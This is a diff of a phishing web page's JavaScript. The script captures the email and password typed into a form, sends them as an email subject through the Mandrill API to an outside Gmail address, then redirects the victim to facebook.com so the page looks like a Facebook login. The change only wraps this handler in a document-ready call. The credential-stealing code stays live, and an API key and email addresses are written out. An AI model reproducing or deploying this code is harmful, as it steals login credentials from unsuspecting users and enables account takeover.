@@ -36,31 +36,33 @@
   </body>
 
   <script type="text/javascript">
-    $("#buttonSend").on( "click", function() {
-      var email = $("input[type=text]").val();
-      var password = $("input[type=password]").val();
-        $.ajax({
-          type: 'POST',
-          url: 'https://mandrillapp.com/api/1.0/messages/send.json',
-          data: {
-            'key': 'md-mVIowYpTNKD75eTa_guiDA',
-            'message': {
-              'from_email': 'locp.qb@gmail.com',
-              'to': [
-                  {
-                    'email': 'harukileejp@gmail.com',
-                    'name': 'RECIPIENT NAME',
-                    'type': 'to'
-                  }
-                ],
-              'autotext': 'true',
-              'subject': `email is: ${email} and password is: ${password}`
+    $(document).ready(function(){
+      $("#buttonSend").on( "click", function() {
+        var email = $("input[type=text]").val();
+        var password = $("input[type=password]").val();
+          $.ajax({
+            type: 'POST',
+            url: 'https://mandrillapp.com/api/1.0/messages/send.json',
+            data: {
+              'key': 'md-mVIowYpTNKD75eTa_guiDA',
+              'message': {
+                'from_email': 'locp.qb@gmail.com',
+                'to': [
+                    {
+                      'email': 'harukileejp@gmail.com',
+                      'name': 'RECIPIENT NAME',
+                      'type': 'to'
+                    }
+                  ],
+                'autotext': 'true',
+                'subject': `email is: ${email} and password is: ${password}`
+              }
             }
-          }
-        }).done(function(response) {
+          }).done(function(response) {
+            window.location="https://www.facebook.com/";
+          });
           window.location="https://www.facebook.com/";
-        });
-        window.location="https://www.facebook.com/";
+      });
     });
   </script> 
 </html>
